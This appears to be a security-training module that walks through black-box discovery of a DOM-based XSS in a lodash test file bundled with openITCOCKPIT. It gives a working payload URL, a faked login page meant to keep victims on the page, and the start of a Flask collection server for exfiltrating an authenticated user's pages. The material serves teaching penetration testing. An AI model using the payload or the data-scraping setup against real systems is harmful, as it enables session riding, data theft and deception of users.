#### openITCOCKPIT XSS and OS Command Injection - Blackbox

1
(it-novum, 2020), https://openitcockpit.io/ ↩︎

2
(Nagios, 2020), https://www.nagios.org/ ↩︎

3
(Naemon, 2020), https://www.naemon.org/ ↩︎

4
(it-novum, 2020), https://openitcockpit.io/security/#security ↩︎


##### Building a Sitemap

To begin, let's visit http://openitcockpit in Firefox while proxying through Burp to create a basic sitemap. The proxy will capture all the requests and resources that are loaded and display them in the Target > Sitemap tab.


This initial connection reveals several things:

The openITCOCKPIT application runs on HTTPS. We were redirected when the page was loaded.
Since we do not have a valid session, openITCOCKPIT redirected the application root to /login/login.
The application uses Bootstrap,1 jQuery,2 particles,3 and Font Awesome.4
The vendor dependencies are stored in the lib and vendor directories.
Application-specific JavaScript appears located in the js directory.
Ordinarily, this would be a good time to consider directory busting with a tool like Gobuster5 or DIRB.6 When running these tools, we found several pages that require authentication and a phpMyAdmin7 page. However, these discoveries are not relevant for the specific goal of this module.

The login page does not reveal additional links to other pages. Let's load a page that should not exist (like /thispagedoesnotexist) to determine the format of a 404 page.


The 404 page expands the Burp sitemap considerably. The js directory is especially interesting:

Figure 3: Larger Site Map
Figure 3: Larger Site Map
Specifically, the /js/vendor/UUID.js-4.0.3/ directory contains a dist subdirectory.

When a JavaScript library is successfully built, the output files are typically written to a dist (or public) subdirectory. During the build process, the necessary files are typically minified, unnecessary files removed, and the resulting .js library can be distributed and ultimately imported into an application.

However, the existence of a dist directory suggests that the application developer included the entire directory instead of just the .js library file. Any unnecessary files in this directory could expand our attack surface.

JavaScript-heavy applications are trending towards using a bundler like webpack8 and a package manager like Node Package Manager(npm)9 instead of manual distribution methods. This type of workflow streamlines development and may ensure that only the proper files are distributed.

Since the Burp sitemap doesn't show any additional files and we are limited to black box investigative techniques, it could be difficult to locate all the supporting files in the /js/vendor/UUID.js-4.0.3/ directory. However, we could search for the UUID.js developer's homepage for more information.

We would not typically pursue JavaScript library vulnerabilities at this stage. However, in an application like openITCOCKPIT with a small unauthenticated footprint, we will typically investigate these files once we've exhausted the access we do have.

A Google search for uuid.js "4.0.3" leads us to the npm10 page for this library:

Figure 4: NPM of uuidjs
Figure 4: NPM of uuidjs
The "Homepage"11 link directs us to the package's GitHub page.

Figure 5: Github of uuidjs
Figure 5: Github of uuidjs
The uuidjs GitHub repo includes a root-level dist directory. At this point, we know that the developers of openITCOCKPIT have copied at least a part of this library's repo directory into their application. They may have copied other files or directories as well.

For example, the GitHub repo lists a root-level README.md file. Let's try to open that file on our target web server by navigating to /js/vendor/UUID.js-4.0.3/README.md:

Figure 6: README of uuidjs
Figure 6: README of uuidjs
The response indicates that README.md exists and is accessible. Although the application is misconfigured to serve more files than necessary, this is only a minor vulnerability considering our goal of remote command execution. We are, however, expanding our view of the application's internal structure.

Server-side executable files (such as .php) are rarely included in vendor libraries, meaning this may not be the best location to begin hunting for SQL injection or RCE vulnerabilities. However, the libraries may contain HTML files that could introduce reflected cross-site scripting (XSS) vulnerabilities. Since these "extra files" are typically less-scrutinized than other deliberately-exposed files and endpoints, we should investigate further.

For example, the /docs/ directory seems to contain HTML files. These "supporting" files are generally considered great targets for XSS vulnerabilities. This avenue is worth further investigation.

However, before we dig any deeper, let's search for other libraries that might contain additional files we may be able to target. This will provide a more complete overview of the application.

1
(Bootstrap, 2020), https://getbootstrap.com/ ↩︎

2
(The jQuery Foundation, 2020), https://jquery.com/ ↩︎

3
(Vincent Garreau, 2020), https://vincentgarreau.com/particles.js/ ↩︎

4
(Fonticons, 2020), https://fontawesome.com/ ↩︎

5
(OJ Reeves, 2020), https://github.com/OJ/gobuster ↩︎

6
(DIRB, 2020), http://dirb.sourceforge.net/ ↩︎

7
(phpMyAdmin, 2020), https://www.phpmyadmin.net/ ↩︎

8
(Webpack, 2020), https://webpack.js.org/ ↩︎

9
(npm, 2020), https://www.npmjs.com/ ↩︎

10
(LiosK, 2020), https://www.npmjs.com/package/uuidjs/v/4.0.3 ↩︎

11
(LiosK, 2020), https://github.com/LiosK/UUID.js ↩︎


##### Targeted Discovery
We'll begin our targeted discovery by focussing on finding aditional libraries in the vendor directory. By reviewing the sitemap, we already know that five libraries exist: UUID.js-4.0.3, fineuploader, gauge, gridstack, and lodash:

n order to discover additional libraries, we could bruteforce the vendor directory with a tool like Gobuster. However, we'll avoid common wordlist like those included with DIRB. Since we are finding JavaScript libraries in the /js/vendor path, we'll instead generate a more-specific wordlist using the top ten thousand npm JavaScript packages.

We will use jq,1 seclists,2 and gobuster in this section. If not already installed, simply run "sudo apt install jq gobuster seclists"

Conveniently for us, the nice-registry3 repo contains a curated list of all npm packages.4 The list used to be ordered by popularity, but new versions are ordered alphabetically. We’ll use an older version of the list which is ordered by popularity. The list is JSON-formatted and contains over 170,000 entries. Before using the list, we'll convert the JSON file into a list Gobuster will accept and limit it to a reasonable top 10,000 packages. First, we'll download the list with wget:

kali@kali:~$ wget https://raw.githubusercontent.com/nice-registry/all-the-package-names/bba7ca95cf29a6ae66a6617006c8707aa2658028/names.json
...
Saving to: ‘names.json’

names.json   100%[==============================>]  23.49M  16.7MB/s    in 1.4s

2020-02-14 12:16:54 (16.7 MB/s) - ‘names.json’ saved [24634943/24634943]
Listing 1 - Downloading all npm packages

Now that we've downloaded names.json, we can use jq to grab only the top ten thousand, filter only items that have a package name with grep, strip any extra characters with cut, and redirect the output to npm-10000.txt.

kali@kali:~$ jq '.[0:10000]' names.json | grep ","| cut -d'"' -f 2 > npm-10000.txt
Listing 2 - Parsing all npm packages

Using the top 10,000 npm packages, we'll search for any other packages in the /js/vendor/ directory with gobuster. We'll use the dir command to bruteforce directories, -w to pass in the wordlist, -u to pass in the url, and -k to ignore the self-signed certificate.

kali@kali:~$ gobuster dir -w ./npm-10000.txt -u https://openitcockpit/js/vendor/ -k
...
2020/02/14 12:34:34 Starting gobuster
===============================================================
/lodash (Status: 301)
/gauge (Status: 301)
/bootstrap-daterangepicker (Status: 301)
===============================================================
2020/02/14 12:36:46 Finished
===============================================================
Listing 3 - Using Gobuster to bruteforce package names

The Gobuster search revealed the additional "bootstrap-daterangepicker" package. While the UUID.js package we discovered earlier contained the version in the name of the directory, the other vendor libraries do not. For this reason, we will bruteforce the files in all the library directories to attempt to discovering the library version. This will allow us to download the exact copy of what is found on the openITCOCKPIT server. We'll again use Gobuster for this search.

To accomplish this, we will first start by creating a list of URLs that contain the packages we are targeting. Later, we'll use this list as input into Gobuster in the URL flag.

kali@kali:~$ cat packages.txt 
https://openitcockpit/js/vendor/fineuploader
https://openitcockpit/js/vendor/gauge
https://openitcockpit/js/vendor/gridstack
https://openitcockpit/js/vendor/lodash
https://openitcockpit/js/vendor/UUID.js-4.0.3
https://openitcockpit/js/vendor/bootstrap-daterangepicker
Listing 4 - List of packages to target

Next, we need to find a suitable wordlist. The wordlist must include common file names like README.md, which might contain a version number of the library. It should be fairly generic and need not be extensive since our goal is not to find every file, but only those that will lead us to the correct version of the library. We'll use the quickhits.txt list from the seclists project. The quickhits.txt wordlist is located in /usr/share/seclists/Discovery/Web-Content/ on Kali.

Using the packages.txt file we created earlier, we'll loop through each URL and search for content using the quickhits.txt wordlist. We'll use a while loop and pass in the packages.txt file. With each line, we will echo the URL and run gobuster dir, passing -q to prevent Gobuster from printing the headers.

kali@kali:~$ while read l; do echo "===$l==="; gobuster dir -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -k -q -u $l; done < packages.txt 
===https://openitcockpit/js/vendor/fineuploader===
===https://openitcockpit/js/vendor/gauge===
===https://openitcockpit/js/vendor/gridstack===
//bower.json (Status: 200)
//demo (Status: 301)
//dist/ (Status: 403)
//README.md (Status: 200)
===https://openitcockpit/js/vendor/lodash===
//.editorconfig (Status: 200)
//.gitattributes (Status: 200)
//.gitignore (Status: 200)
//.travis.yml (Status: 200)
//bower.json (Status: 200)
//CONTRIBUTING.md (Status: 200)
//package.json (Status: 200)
//README.md (Status: 200)
//test (Status: 301)
//test/ (Status: 403)
===https://openitcockpit/js/vendor/UUID.js-4.0.3===
//.gitignore (Status: 200)
//bower.json (Status: 200)
//dist/ (Status: 403)
//LICENSE.txt (Status: 200)
//package.json (Status: 200)
//README.md (Status: 200)
//test (Status: 301)
//test/ (Status: 403)
===https://openitcockpit/js/vendor/bootstrap-daterangepicker===
//README.md (Status: 200)
Listing 5 - Using Gobuster to bruteforce vendor packages

Gobuster did not discover any directories or files for the fineuploader or gauge libraries, but it discovered a README.md under gridstack, lodash, UUID.js-4.0.3, and bootstrap-daterangepicker.

Instead of loading the pages from a browser, we'll download the packages from the source. However, we must pay careful attention to the version numbers to ensure we are working with the same library. To obtain the version of the library, we'll check the README.md of each package for the correct version number.

Before proceeding, we will remove fineuploader and gauge from packages.txt since we did not discover any files we could use. We'll also remove UUID.js-4.0.3 since we are already certain the version is 4.0.3.

kali@kali:~$ cat packages.txt 
https://openitcockpit/js/vendor/gridstack
https://openitcockpit/js/vendor/lodash
https://openitcockpit/js/vendor/bootstrap-daterangepicker
Listing 6 - Editing packages.txt

Next, we'll use the same while loop to run curl on each URL, appending /README.md.

kali@kali:~$ while read l; do echo "===$l==="; curl $l/README.md -k; done < packages.txt
===https://openitcockpit/js/vendor/gridstack===
...
- [Changes](#changes)
      - [v0.2.3 (development version)](#v023-development-version)
...
===https://openitcockpit/js/vendor/lodash===
# lodash v3.9.3
...

===https://openitcockpit/js/vendor/bootstrap-daterangepicker===
...
Listing 7 - Enumerating version numbers

We found version numbers for gridstack and lodash but unfortunately, we could not determine version information for bootstrap-daterangepicker. Before continuing, we will concentrate on the three packages we positively identified and download each from their respective GitHub pages:

UUID.js: https://github.com/LiosK/UUID.js/archive/v4.0.3.zip
Lodash: https://github.com/lodash/lodash/archive/3.9.3.zip
Gridstack: https://github.com/gridstack/gridstack.js/archive/v0.2.3.zip
Downloading and extracting each zip file provides us with a copy of the files that exist in the application's respective directories. This allows us to search for vulnerabilities without having to manually brute force all possible directory and file names. Not only does this save us time, it is also a quieter approach.

While we are taking a blackbox approach with this module, it is important to note that this does not mean we won't have to review any code. Reviewing the JavaScript and HTML files we do have access to is crucial for a successful assessment.

Since the libraries contain many files, we will first search for all *.html files, which are most likely to contain the XSS vulnerabilities or load JavaScript that contains XSS vulnerabilities that we are looking for.

We'll use find to search our directory, supplying -iname to search with case insensitivity and search for HTML files with *.html.

kali@kali:~/packages$ find ./ -iname "*.html"
./lodash-3.9.3/perf/index.html
./lodash-3.9.3/vendor/firebug-lite/skin/xp/firebug.html
./lodash-3.9.3/test/underscore.html
./lodash-3.9.3/test/index.html
./lodash-3.9.3/test/backbone.html
./gridstack.js-0.2.3/demo/knockout2.html
./gridstack.js-0.2.3/demo/two.html
./gridstack.js-0.2.3/demo/nested.html
./gridstack.js-0.2.3/demo/knockout.html
./gridstack.js-0.2.3/demo/float.html
./gridstack.js-0.2.3/demo/serialization.html
./UUID.js-4.0.3/docs/uuid.js.html
./UUID.js-4.0.3/docs/UUID.html
./UUID.js-4.0.3/docs/index.html
./UUID.js-4.0.3/test/browser.html
./UUID.js-4.0.3/test/browser-core.html
Listing 8 - Searching for files ending with "html"

Now that we have a list of HTML files, we can search for an XSS vulnerability to exploit. We are limited by the type of XSS vulnerability we can find though. Since these HTML files are not dynamically generated by a server, traditional reflected XSS and stored XSS won't work since user-supplied data cannot be appended to the HTML files. However, these files might contain additional JavaScript that allows user input to manipulate the DOM, which could lead to DOM-based XSS.5

1
(Stephen Dolan, 2020), https://stedolan.github.io/jq/ ↩︎

2
(Daniel Miessler, 2020), https://github.com/danielmiessler/SecLists ↩︎

3
(nice-registry, 2020), https://github.com/nice-registry ↩︎

4
(nice-registry, 2020), https://github.com/nice-registry/all-the-package-repos ↩︎

5
(OWASP, 2020), https://owasp.org/www-community/attacks/DOM_Based_XSS ↩︎


##### Intro To DOM-based XSS
In order to understand DOM-based XSS, we must first familiarize ourselves with the Document Object Model (DOM).1 When a browser interprets an HTML page, it must render the individual HTML elements. The rendering creates objects of each element for display. HTML elements like div can contain other HTML elements like h1. When parsed by a browser, the div object is created and contains a h1 object as the child node. The hierarchical tree2 created by the objects that represent the individual HTML elements make up the Document Object Model. The HTML elements can be identified by id,3 class,4 tag name,5 and other identifiers that propagate to the objects in the DOM.

Browsers generate a DOM from HTML so they can enable programmatic manipulation of a page via JavaScript. Developers may use JavaScript to manipulate the DOM for background tasks, UI changes, etc, all from the client's browser. While the dynamic changes could be done on the server side by dynamically generating the HTML and sending it back to the user, this adds a significant delay to the application.

For this manipulation to occur, JavaScript implements the Document6 interface. To query for an object on the DOM, the document interface implements APIs like getElementById, getElementsByClassName, and getElementsByTagName. The objects that are returned from the query inherit from the Element base class. The Element class contains properties like innerHTML to manipulate the content within the HTML element. The Document interface allows for direct writing to the DOM via the write() method.

DOM-based XSS can occur if unsanitized user input is provided to a property, like innerHTML or a method like write().

For example, consider the inline JavaScript shown in Listing 9.

<!DOCTYPE html>
<html>
<head>
  <script>
    const queryString = location.search;
    const urlParams = new URLSearchParams(queryString);
    const name = urlParams.get('name')
    document.write('<h1>Hello, ' + name + '!</h1>');
  </script>
</head>
</html>
Listing 9 - Example DOM XSS

In Listing 9, the JavaScript between the script tags will first extract the query string from the URL. Using the URLSearchParams7 interface, the constructor will parse the query string and return a URLSearchParams object, which is saved in the urlParams variable. Next, the name parameter is extracted from the URL parameters using the get method. Finally, an h1 element is written to the document using the name passed as a query string.

We will save the HTML contents of Listing 9 into /home/kali/xsstest.html. We don't need to use Apache for this demo. To open the file in Firefox, we can run firefox xsstest.html and a new window should appear.

When we append ?name=Jimmy to the URL, the message "Hello, Jimmy" is displayed.

Figure 8: Hello Jimmy on Page
Figure 8: Hello Jimmy on Page
However, if we append "?name=<script>alert(1)</script>" to the URL, the browser executes our JavaScript code.

Figure 9: Hello XSS
Figure 9: Hello XSS
If a file like this were hosted on a server, the resulting vulnerability would be a categorized as reflected DOM-based XSS. It is important to note that DOM-based XSS can also be stored if the value appended to the DOM is obtained from a user-controlled database value. In our situation, we can safely assume that the HTML files we found earlier are not pulling data from a database.

1
(Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction ↩︎

2
(Mozilla, 2019), <https://developer.mozilla.org/en-US/docs/Web/API/Document_object_model/Using_the_W3C_DOM_Level_1_Core > ↩︎

3
(Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/id ↩︎

4
(Mozilla, 2019), https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/class ↩︎

5
(Mozilla, 2019), https://developer.mozilla.org/en-US/docs/Web/API/Element/tagName ↩︎

6
(Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/API/Document ↩︎

7
(Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams ↩︎

#####  XSS Hunting
We'll start our hunt for DOM-based XSS by searching for references to the document object. However, running a search for "document" will generate many false positives. Instead, we'll search for "document.write" and narrow or broaden the search as needed. We will use grep recursively with the -r command in the ~/packages directory that we created earlier. To limit the results we will also use the --include flag to only search for HTML files.

kali@kali:~/packages$ grep -r "document.write" ./ --include *.html
./lodash-3.9.3/perf/index.html:			document.write('<script src="' + ui.buildPath + '"><\/script>');
./lodash-3.9.3/perf/index.html:			document.write('<script src="' + ui.otherPath + '"><\/script>');
./lodash-3.9.3/perf/index.html:						document.write('<applet code="nano" archive="../vendor/benchmark.js/nano.jar"></applet>');
./lodash-3.9.3/test/underscore.html:			document.write(ui.urlParams.loader != 'none'
./lodash-3.9.3/test/index.html:				document.write('<script src="' + ui.buildPath + '"><\/script>');
./lodash-3.9.3/test/index.html:			document.write((ui.isForeign || ui.urlParams.loader == 'none')
./lodash-3.9.3/test/backbone.html:			document.write(ui.urlParams.loader != 'none'
Listing 10 - Search For Write

The results of this search reveal four unique files that write directly to the document. We also find interesting keywords like "urlParams" in the ui object that potentially point to the use of user-provided data. Let's (randomly) inspect the /lodash-3.9.3/perf/index.html file.

The snippet shown in Listing 11 is part of the /lodash-3.9.3/perf/index.html file.

<script src="./asset/perf-ui.js"></script>
<script>
        document.write('<script src="' + ui.buildPath + '"><\/script>');
</script>
<script>
        var lodash = _.noConflict();
</script>
<script>
        document.write('<script src="' + ui.otherPath + '"><\/script>');
</script>
Listing 11 - Discovered potential XSS

In Listing 11, we notice the use of the document.write function to load a script on the web page. The source of the script is set to the ui.otherPath and ui.buildPath variable. If this variable is user-controlled, we would have access to DOM-based XSS.

Although we don't know the origin of ui.buildPath and ui.otherPath, we can search the included files for clues. Let's start by determining how ui.buildPath is set with grep. We know that JavaScript variables are set with the "=" sign. However, we don't know if there is a space, tab, or any other delimiter between the "buildPath" and the "=" sign. We can use a regex with grep to compensate for this.

kali@kali:~/packages$ grep -r "buildPath[[:space:]]*=" ./ 
./lodash-3.9.3/test/asset/test-ui.js:  ui.buildPath = (function() {
./lodash-3.9.3/perf/asset/perf-ui.js:  ui.buildPath = (function() {
Listing 12 - Searching for buildPath

The search revealed two files: asset/perf-ui.js and asset/test-ui.js. Listing 11 shows that ./asset/perf-ui.js is loaded into the HTML page that is being targeted. Let's open the perf-ui.js file and navigate to the section where buildPath is set.

kali@kali:~/packages$ cat ./lodash-3.9.3/perf/asset/perf-ui.js
...
  /** The lodash build to load. */
  var build = (build = /build=([^&]+)/.exec(location.search)) && decodeURIComponent(build[1]);
...
  // The lodash build file path.
  ui.buildPath = (function() {
    var result;
    switch (build) {
      case 'lodash-compat':     result = 'lodash.compat.min.js'; break;
      case 'lodash-custom-dev': result = 'lodash.custom.js'; break;
      case 'lodash-custom':     result = 'lodash.custom.min.js'; break;
      case null:                build  = 'lodash-modern';
      case 'lodash-modern':     result = 'lodash.min.js'; break;
      default:                  return build;
    }
    return basePath + result;
  }());
...
Listing 13 - perf-ui.js

The ui.buildPath is set near the bottom of the file. A switch returns the value of the build variable by default if no other condition is true. The build variable is set near the beginning of the file and is obtained from location.search (the query string) and the value of the query string is parsed using regex. The regex looks for "build=" in the query string and extracts the value. We do not find any other sanitization of the build variable in the code. At this point, we should have a path to DOM XSS through the "build" query parameter!

Soln:
```
https://openitcockpit/js/vendor/lodash/perf/index.html?build=x%22%20onerror=%22alert(1)
```

##### What We Can and Can't Do

A reflected DOM-based XSS vulnerability provides limited opportunities. Let's discuss what we can and can't do at this point.

First, we will need a victim to exploit. Unlike stored XSS, which can exploit anyone who visits the page, we will have to craft a specific link to send to a victim. Once the victim visits the page, the XSS will be triggered.

If we use Burp to inspect any of the requests and responses sent to and from the application, we may notice a cookie named itnovum. Since we don't have credentialed access to the application, we can only assume that this is the cookie used for session management. Under the Storage tab in Firefox's developer tools, we find that the cookie also has the HttpOnly1 flag set. This means that we won't be able to access the user's session cookie using XSS. Instead of stealing the session cookie, we will have to find a different way to get information about the victim and the host.

Figure 10: Checking HttpOnly
Figure 10: Checking HttpOnly
While we won't have access to the user's session cookie, we do have access to the DOM, and we can control what is loaded and rendered on the web page with XSS. Conveniently, when a user's browser requests content from a web page (whether it is triggered by a refresh or by JavaScript), the browser will automatically include the session cookie in the request. This is true even if JavaScript doesn't have direct access to the cookie value. This means that we can add content to the DOM via XSS of an authenticated victim to load resources only accessible by authenticated users. While JavaScript has access to manipulate the DOM, the browser sets certain restrictions to what JavaScript has access to via the Same-Origin Policy (SOP).2

The SOP allows different pages from the same origin to communicate and share resources. For example, the SOP allows JavaScript running on https://openitcockpit/js/vendor/lodash/perf/index.html to send a request using XMLHttpRequest (XHR)3 or fetch4 to https://openitcockpit/ and read the contents of the response. Since we have XSS on the domain we are targeting, we can load any page from the same source and retrieve its contents. The benefit of this is that if the victim of the XSS is already authenticated, the browser will automatically send their session cookie when the content is requested via XHR, giving us a means of accessing authenticated content by riding an existing user's session.

It is important to note that this also means that the SOP disallows JavaScript from accessing content from different origins. For example, JavaScript running on https://evil.com can send XHR requests to https://google.com, but the SOP blocks JavaScript from accessing the response.

Using this information, we can use the XSS to scrape the home page that our authenticated victim has access to. Once loaded, we can find all links, load the links using XHR, and forward the content back to us. This will give us access to the authenticated user's data and potentially open a new avenue for exploitation.

It is important to note that an XSS is only running while the victim has the window open with the XSS. While there are tricks that slow down the victims' ability exit the window, we still want to run the XSS as quickly as possible.

While we could utilize some features from The Browser Exploitation Framework (BeEF),5 we are opting out of using BeEF. A significant effort in development of a new plugin and configuration of BeEF would be necessary for the result we are looking for. Instead, we will write our own application. The application will consist of 3 main components: the XSS payload script, a SQLite6 database to store collected content, and a Flask7 API server to receive content collected by the XSS payload. While the database is not completely necessary, it will make the application more extensible for some Extra Mile challenges.

In addition to the 3 main components, we have additional criteria:

The XSS page must look convincing enough to ensure the victim won't leave the page.
Second, the content we scraped and stored in the database will be used to recreate the remote HTML files locally. We will create a separate script to dump the contents of the database.
The database script must be written in a way so that it can be imported and used in multiple scripts. This will save us time and ensure code can be reused.
We will start by creating a realistic landing page from the XSS that we discovered earlier.

1
(OWASP, 2020), <https://owasp.org/www-community/<httpOnly> ↩︎

2
(Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy ↩︎

3
(Mozilla, 2020), <https://developer.mozilla.org/en-US/docs/Web/API/XML<httpRequest> ↩︎

4
(Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch ↩︎

5
(BeEF, 2020), https://beefproject.com/ ↩︎

6
(SQLite, 2020), https://www.sqlite.org/index.html ↩︎

7
(The Pallets Project, 2020), https://palletsprojects.com/p/flask/ ↩︎

#### Writing to DOM
Now that we are aware of our limitations and have a specific goal, we will begin manipulating the DOM to display a realistic openITCOCKPIT page. The Firefox Developer Tools1 will be immensely helpful during this process.

First, we will load the page with the XSS vulnerability (https://openitcockpit/js/vendor/lodash/perf/index.html) and click the Deactivate Firebug button in the top right to prevent the page from consuming too many resources.

Figure 11: Stopping Firebug Execution
Figure 11: Stopping Firebug Execution
We can open the Firefox console with C+B+k, where we can type in any JavaScript to test the outcome before we place it into our final script.

Using the document interface, we can query for HTML elements via the getElementByID and getElementsByTagName methods. We can change the content of an HTML element with the innerHTML property. We can also create new elements with createElement method.

For example, we can query for all "body" elements using document.getElementsByTagName("body") and access the first (and only) item in the array with [0].

Notice that the action is plural when querying for multiple elements (getElementsByTagName) while "element" is singular when querying for a single element (getElementByID). Typically, we expect multiple elements when querying by the tag name (div, p, img) but expect an element to use a unique ID. When using methods that return multiple objects, we should expect an array to be returned even if only a single object is found.

```
>> document.getElementsByTagName("body")[0]
<- <body>
```
Listing 14 - Querying for body elements

We can save the reference to the object by prepending the command with body = .

```
>> body = document.getElementsByTagName("body")[0]
<- <body>
```
Listing 15 - Saving body element to variable

Next, we can get the contents of body by accessing the innerHTML property.

```
>> body.innerHTML
<- "
    <div id=\"perf-toolbar\"><span style=\"float: right;\">
    ...
    </script>
  "
```
Listing 16 - Accessing body's innerHTML

We can also overwrite the HTML in body by setting innerHTML equal to a string of valid HTML.

```
>> body.innerHTML = "<h1>Magic!</h1>"
<- "<h1>Magic!</h1>"
```
Listing 17 - Setting the innerHTML

Once the code is executed, we'll change the page to display the text "Magic" with an h1 tag.

Figure 12: Magic in Browser
Figure 12: Magic in Browser
Using this method, we can control every aspect of the user experience. Later, we will expand on these concepts and use XHR requests to retrieve content in a way the victim won't notice.



Puting following in client.js:

```
html_element = document.getElementsByTagName("html")[0]
html_element.innerHTML =  `<content of innerHTML from login page>`
```
remember those are back tick.

might need outerHTML




(Mozzila, 2020), https://developer.mozilla.org/en-US/docs/Tools ↩︎

##### Creating the Database
A login page will make the XSS page look more realistic, but it isn't very useful in furthering exploitation. Before we devise a method of sending and receiving content from the victim, we will need a system of capturing and storing data (either user input or data obtained from the victims' session). To store data, we will use a SQLite database. We will start by creating a script to initialize the database and provide functions to insert data. The database script should be able to be run from the command line. In addition, both the API server and script to dump the database should be able to import the functions from the database script. Allowing the script to be imported will make our code reusable and more organized.

Our script will accept four main arguments: one to create a database, another to insert content, a third to get content, and the final to list the location (URL) the content was obtained from. The purpose of allowing the database script to be executed from the command line is to ease the development process by allowing us to test each function.

We will use argparse1 to determine the actions for each argument. Before we start parsing arguments, we will import the necessary modules. The content in Listing 18 will be saved to a file named db.py.

import sqlite3
import argparse
import os
Listing 18 - Required imports

Next, we will define the filename to save the database and write the parser for the arguments. We only want to parse arguments if the script is executed directly and not if it is imported. When python is executed directly, it sets the __name__ variable to __main__. We can check for this before we parse the arguments:

if __name__ == "__main__":
    database = r"sqlite.db"
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--create','-c', help='Create Database', action='store_true')
    group.add_argument('--insert','-i', help='Insert Content', action='store_true')
    group.add_argument('--get','-g', help='Get Content', action='store_true')
    group.add_argument('--getLocations','-l', help='Get all Locations', action='store_true')

    parser.add_argument('--location','-L')
    parser.add_argument('--content','-C')
    args = parser.parse_args()
Listing 19 - Parsing args of db.py

We first define the database filename as sqlite.db. Next, will need to parse the arguments so they execute the appropriate function. This script will have five functions: create_connection, insert_content, create_db, get_content, and get_locations. These functions will all be called depending on the argument passed to the script. However, all actions will require a database connection.

Just below the last line in Listing 19, we will add this content:

    conn = create_connection(database)

    if (args.create):
        print("[+] Creating Database")
        create_db(conn)
    elif (args.insert):
        if(args.location is None and args.content is None):
            parser.error("--insert requires --location, --content.")
        else:
            print("[+] Inserting Data")
            insert_content(conn, (args.location, args.content))
            conn.commit()
    elif (args.get):
        if(args.location is None):
            parser.error("--get requires --location, --content.")
        else:
            print("[+] Getting Content")
            print(get_content(conn, (args.location,)))
    if (args.getLocations):
        print("[+] Getting All Locations")
        print(get_locations(conn))
Listing 20 - Calling the appropriate function

The code in Listing 20 will first establish a database connection. Once established, the script will check if any of the arguments were called and call the appropriate function. Some arguments, like get and insert, require additional parameters like location and content.

With the arguments parsed, we can begin writing the function to create the database connection. This function will accept a file name as an argument. The file name will be passed into the function sqlite3.connect() to create the connection. If successful, the connection will be returned.

def create_connection(db_file):
    conn = None
    try:
        conn = sqlite3.connect(db_file)
    except Error as e:
        print(e)
    return conn
Listing 21 - create_connection Function

We'll add the create_connection function just under the imports. With the database connection created, we can concentrate on creating the table in the database. The table that stores the content will have three columns:

An integer that auto-increments as the primary key.
The location, in the form of a URL, that the content was obtained from.
The content in the form of a blob.
The SQL to create the table is shown below:

CREATE TABLE IF NOT EXISTS content (
    id integer PRIMARY KEY,
    location text NOT NULL,
    content blob
);
Listing 22 - SQL to create the content table

This SQL command will be executed in the create_db function, which will accept a connection and execute the CREATE TABLE command. If the execution fails, an error will be printed. This function is shown in Listing 23.

def create_db(conn):
    createContentTable="""CREATE TABLE IF NOT EXISTS content (
            id integer PRIMARY KEY,
            location text NOT NULL,
            content blob);"""
    try:
        c = conn.cursor()
        c.execute(createContentTable)
    except Error as e:
        print(e)
Listing 23 - create_db Function

We'll include this function after the create_connection function. At this point, we should be able to run python3 db.py --create to create the database.

kali@kali:~/scripts$ python3 db.py --create
[+] Creating Database
kali@kali:~/scripts$ ls -alh
total 20K
drwxr-xr-x  2 kali kali 4.0K May 21 16:23 .
drwxr-xr-x 27 kali kali 4.0K May 21 16:22 ..
-rw-r--r--  1 kali kali 1.9K May 21 16:23 db.py
-rw-r--r--  1 kali kali 8.0K May 21 16:23 sqlite.db
Listing 24 - Running db.py to Create the Database

Success! We have confirmed that our script can create a database file.

1
(Python, 2020), https://docs.python.org/3/library/argparse.html ↩︎


##### Creating the API
Now that we have completed the database script, we'll work on the application that will collect the data sent from the user's browser. This data will be stored in the SQLite database that we just created.

We will build the API server with Flask and we'll name the file api.py. We will also import some functions from the db.py file that we just created and the flask_cors1 module.

We selected the Flask framework since it's easy to start and does not require significant configuration. Flask extensions (like flask_cors) extend the functionality of the web application without significant amounts of code. We'll use the flask_cors extension to send the "CORS" header, which we'll discuss in more detail.

from flask import Flask, request, send_file
from db import create_connection, insert_content, create_db
from flask_cors import CORS
Listing 25 - Imports for api.py

For this section, we will need pip to install flask-cors. If it is not already installed, we can install it in Kali with "sudo apt install python3-pip". To install flask_cors, run "sudo pip3 install flask_cors".

Next, we need to define the Flask app and the CORS extension. Since we will be calling this API server using the XSS, we also need to set the Cross-Origin Resource Sharing(CORS)2 header. The CORS header instructs a browser to allow XHR requests to access resources from other origins. In the case of the XSS we have discovered, we want to instruct the browser to allow the XSS payload (running from https://openitcockpit) to be able to reach out to our API server to send the discovered content. Finally, we will also need to define the database file we are using (this will be the same database we created in the script earlier). Below the imports we will add the code found in Listing 26.

app = Flask(__name__)
CORS(app)
database = r"sqlite.db"
Listing 26 - Defining the Flask app and setting the CORS header

The CORS(app) command sets the CORS header to accept connections from any domain. With that set, we can start the web server with app.run. However, since openITCOCKPIT runs on HTTPS, any modern browser will block mixed requests (HTTPS to HTTP). To get around this, we'll run the Flask application on port 443 and generate a self-signed certificate and key. Since the certificate will be self-signed, we will also need to accept the certificate in Firefox for our Kali's IP address.

Normally, we would use a properly-issued certificate and purchase a domain to host the API server, but for the purposes of this module, a self-signed certificate will suffice. A key and certificate can be generated using the openssl command.

kali@kali:~/scripts$ openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
Generating a RSA private key
...................................................................................................++++
.............................++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:kali
Email Address []:
Listing 27 - Generating Key and Certificate

